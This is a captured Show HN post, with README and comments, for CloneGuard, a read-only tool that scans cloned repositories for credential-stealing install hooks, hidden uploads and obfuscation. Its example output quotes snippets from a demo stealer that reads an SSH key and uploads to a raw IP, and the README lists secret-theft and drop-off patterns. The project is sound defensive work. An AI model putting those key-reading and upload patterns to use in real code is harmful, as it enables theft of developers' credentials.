---
type: "corpus"
item_id: "dcb7edf0c93fe6cb"
title: "Show HN: CloneGuard – Scan a repo for credential-stealing tricks before it runs"
source: "hn_show"
source_name: "HN Show HN"
url: "https://news.ycombinator.com/item?id=50397435"
project_url: "https://github.com/tharun208/cloneguard"
author: "tharun208"
published_at: "2026-11-06T19:49:27Z"
captured_at: "2026-11-07T09:43:25+08:00"
lang: "en"
kind: "post"
topic: "开发者工具"
shard: "2026-11-07"
pub_day: "2026-11-06"
tags:
  - 语料
  - hn_show
  - author_tharun208
  - story_50397435
  - show_hn
metrics: {"points": 28, "comments": 7, "engagement_velocity": 28}
comments_count: 7
comments_total: 7
discovered_via: "hn:show_hn:3d"
---

# Show HN: CloneGuard – Scan a repo for credential-stealing tricks before it runs

> [!info] 一句话导读
> tharun208/cloneguard

> [!meta]- 语料信息（点开展开）
> 来源：HN Show HN（post）
> 原帖：<https://news.ycombinator.com/item?id=50397435>
> 指标：点赞=28 · 评论=7 · engagement_velocity=28
> 作者：tharun208　|　发布：2026-11-06T19:49:27Z
> 项目链接：<https://github.com/tharun208/cloneguard>
> 采集：2026-11-07T09:43:25+08:00　|　id：`dcb7edf0c93fe6cb`

## 正文

# tharun208/cloneguard

Scan a repo for malware tricks before you run it. Catches credential theft, hidden network calls, obfuscated code and auto-run hooks. Read-only, with no dependencies.

- Stars: 0
- Forks: 0
- Watchers: 0
- Open issues: 0
- License: MIT License
- Default branch: main
- Created: 2026-11-03T22:19:55Z

## Languages

- Go

## Top Contributors

- tharun208 (3 contributions)

---

## README

# CloneGuard

Scan a project for malware tricks **before** you run it. Built after a fake-recruiter
"demo app" tried to steal SSH and AWS keys.

cloneguard is a small, dependency-free Go command-line tool. It only reads files. It
never runs, installs, or imports anything from the project it scans.

## Why this exists

A common attack goes like this: someone posing as a recruiter sends you a "take-home
assignment" or "demo app". You clone it, run `npm install` or open it in your editor,
and it quietly uploads your SSH keys, cloud credentials, browser passwords or crypto
wallets. Often the trigger isn't the app itself but an install hook or an editor task
that runs the moment you open the folder.

cloneguard is a quick first look that catches the usual tricks, so you can decide
whether the project is safe to touch.

## Build

Requires Go 1.24+. There are no third-party dependencies.

 go build -o cloneguard ./cmd/cloneguard

Optionally put the binary on your PATH, for example `mv cloneguard /usr/local/bin/`.

## Usage

 cloneguard clone https://github.com/someone/demo-app # clone, then scan right away
 cloneguard scan ./some-folder # scan an existing folder
 cloneguard scan # scan the current folder
 cloneguard ./some-folder # shorthand for scan
 cloneguard scan --json ./some-folder # machine-readable output

`clone` runs `git clone` (which downloads files but does not execute project code) into
a folder named after the repo, or into `[dir]` if you give one, then scans it.

Other commands: `cloneguard help`, `cloneguard version`.

### Flags

Flags go **before** the path.

| Flag | Meaning |
|------|---------|
| `--json` | Print results as JSON instead of text |
| `--include-deps` | Also scan `node_modules` (slow; skipped by default) |
| `--max-size-mb N` | Skip files larger than N MB (default 2) |
| `--no-color` | Plain output. Also honored: the `NO_COLOR` env var and `TERM=dumb` |

### Exit codes

| Code | Verdict | Meaning |
|------|---------|---------|
| 0 | clean | No red flags found |
| 1 | caution | Only medium-severity findings |
| 2 | suspicious | At least one high-severity finding |
| 3 | dangerous | At least one critical finding |
| 10 | error | Bad usage, unreadable path, or `git clone` failed |

This makes it easy to use in scripts or a git hook, e.g.
`cloneguard scan . || exit 1`.

## Example

Scanning the bundled `demo/` folder, which contains a fake stealer and an auto-run
VS Code task:

 $ cloneguard scan --no-color demo

 DANGEROUS Do not run or install anything from this project.
 1 critical, 2 high, 1 medium, 0 low

 [CRITICAL] util.js:1 Reaches for your secrets AND talks to a suspicious server
 [HIGH] .vscode/tasks.json:1 Runs a command the moment you open the folder
 [HIGH] util.js:1 Touches your SSH keys
 > readFile("~/.ssh/id_rsa");
 [MEDIUM] util.js:2 Connects to a raw IP address
 > fetch("http://203.0.113.7:8080/upload");

Each finding shows the file and line, the offending snippet, and a plain-English
explanation of why it matters. (Output above is abbreviated.)

### JSON output

With `--json` the result has this shape:

 {
 "root": "demo",
 "files_scanned": 2,
 "files_skipped": 0,
 "findings": [
 { "rule": "reads-ssh-keys", "title": "Touches your SSH keys",
 "severity": "high", "file": "util.js", "line": 1,
 "snippet": "...", "why": "..." }
 ],
 "verdict": "dangerous"
 }

## What it looks for

- **Secret theft:** code that reaches for SSH keys, cloud credentials (AWS, GCP,
 Azure, Kubernetes, Docker, npm, Git), shell history, browser passwords, wallets, or
 dumps all environment variables
- **Suspicious network use:** connections to raw IPs, webhook/paste/request-catcher
 drop-off sites (Discord webhooks, Telegram bots, pastebin, webhook.site, ...), public
 tunnel services, or base64-hidden URLs
- **Download-and-run:** code that downloads or decodes text and then executes it
 (`eval`, `new Function`, `curl | sh`)
- **Auto-run hooks:** npm install scripts, `.vscode/tasks.json` tasks that run when the
 folder is opened, risky `setup.py`
- **Obfuscation:** scrambled code such as `_0x` identifiers, hex escapes, or code hidden
 behind long runs of whitespace
- **Compiled binaries** (`.exe`, `.dll`, `.so`, `.dylib`, `.node`, ...) checked into the repo
- **Dangerous combinations in one file**, such as reading keys AND talking to a
 suspicious server, which is escalated to critical

## How it works

1. Walks the folder, skipping `.git`, `node_modules`, `__pycache__`, `.venv` and `venv`
 (unless `--include-deps`), plus files over the size limit.
2. Classifies each file as code, config, docs, lockfile or binary, and applies only the
 rules that make sense for that kind (docs and lockfiles are ignored for text rules).
3. Runs line-by-line regex rules and per-file checks (for example parsing
 `package.json` for install hooks).
4. Combines findings: if one file has hits from multiple risky categories
 (credentials, network, dynamic execution, obfuscation), it raises a combined finding.
5. Picks a verdict from the worst severity found (see exit codes above).

## Limits

"No red flags found" is not proof of safety. It only means none of these common
tricks were spotted. cloneguard is pattern-based, so determined attackers can evade it,
and it can produce false positives on legitimate code (a password manager *should*
touch browser data). For code from strangers, still use a throwaway VM or container.

## Develop

 go test ./...

Layout:

- `cmd/cloneguard/main.go`: CLI, flags and `clone` handling
- `internal/scanner/rules.go`: line-level detection rules (ID, severity, regex, explanation)
- `internal/scanner/filechecks.go`: per-file checks (package.json hooks, tasks.json, setup.py, binaries)
- `internal/scanner/scanner.go`: directory walk, file classification, verdict logic
- `internal/report/report.go`: human-readable text output
- `demo/`: a deliberately malicious sample for trying the tool

To add a detection, append a rule to `lineRules` in `rules.go` with an `id`, `title`,
severity, category, scope, regex and a plain-English `why`, then add a test in
`internal/scanner/scanner_test.go`.

## License

MIT. See LICENSE.

# 0.9.5: no computer has to stay on

## 评论（7/7）

> **tharun208** · 2026-11-06T19:49:27.000Z　
> Hi HN, I built CloneGuard after a fake recruiter had me run a “take-home” codebase on a call. I ran it once, stopped it, and later asked an AI tool to explain the code. It was a stealer going after SSH and AWS keys. I reported it to IT immediately, but it made me realize I had no quick way to vet a repo before touching it.In these attacks the payload is often not the app itself. It’s an npm install script or a .vscode/tasks.json task that runs the moment you open the folder. So CloneGuard looks for exactly that kind of thing.It’s a single Go binary with no dependencies, and it is read-only. It never runs, installs or imports anything from the project.cloneguard clone https://github.com/someone/demo-app
> cloneguard scan ./some-folderWhat it flags:reads of SSH keys, cloud credentials (AWS, GCP, Azure, kube), browser data, wallets
> connections to raw IPs, webhooks, pastebins, tunnels
> download-and-run patterns (eval, curl | sh)
> auto-run hooks (npm scripts, VS Code tasks, setup.py)
> obfuscated code and committed binariesA file that both reads secrets and talks to a suspicious server is escalated to “critical”. Exit codes (0-3) make it easy to drop into a script or git hook. The demo/ folder has a deliberately malicious sample you can try it on.Limitations: it’s regex and heuristic based, so a determined attacker can evade it, and legitimate code (a password manager, for instance) can trigger false positives. “Clean” doesn’t mean safe. For code from strangers, still use a throwaway VM.I’d love feedback on techniques it misses, false positives you hit, and rules you’d want added.

---

> **bandie91** · 2026-11-06T20:26:25.000Z　
> cool, now they know how to hide better.why not improve tooling on how to run untrusted code in isolated environments? this covers wider range of applicable situations.

---

> **rsoto2** · 2026-11-06T20:43:08.000Z　
> How about we don't run code we do not trust. There is enough rogue code running around on a laptop. Also, to people making interviewees run untrusted code, give a 3rd party desktop access, why don't you imbeciles figure out how to TALK to people and look at their experience and figure out a hiring process like any regular business not run by inept anti-environment, anti-human psychopathic CEOs. It's really not that hard to discuss pseudocode, discuss project history and design, and figure out someone's problem solving skills.

---

> **chinathrow** · 2026-11-06T20:47:11.000Z　
> > It’s an npm install script or a .vscode/tasks.json task that runs the moment you open the folder.WTF. Is that really a thing?autorun.inf called, it wants their method back.

---

> **nxtfari** · 2026-11-06T20:49:28.000Z　
> In this day and age this is a bit like bringing a knife to a biocybernetic nanomaterial mimic fight. You will have much better results, with all untrusted software atp, instead of putting trust in a regex filter, asking any recent AI agent “I’m about to clone this repo, can you scan it for anything malicious/suspicious, phone-homes, possible hidden payloads, or secret update/c&c pathways?”Even that is not guaranteed to keep you safe depending on the model used and the sophistication of the malware, but you’ll at least have a much better chance than a filtering tool. I am not being HN-paranoia-brained when I say it is the bare minimum for installing any software that comes from someone else, Github or an easily-compromised supply chain today.

---

> **touristtam** · 2026-11-06T23:00:12.000Z　
> I thought it was common practice to keep a machine that one wipe clean after each interview.

---

> **tomhow** · 2026-11-06T20:45:12.000Z　
> Please don't post shallow dismissals on HN. The guidelines make it clear we're trying for something better here. https://news.ycombinator.com/newsguidelines.html

## 关联链接

- http://203.0.113.7:8080/upload
- https://github.com/someone/demo-app

## 导航

- 项目页：[[10-项目/github.com_c2a9c09e]]
- 渠道页：[[50-渠道/hn_show]]
- 赛道：`开发者工具`（见 [[浏览]] 的「按赛道」视图）
- 同渠道/同赛道批量浏览：[[浏览]]
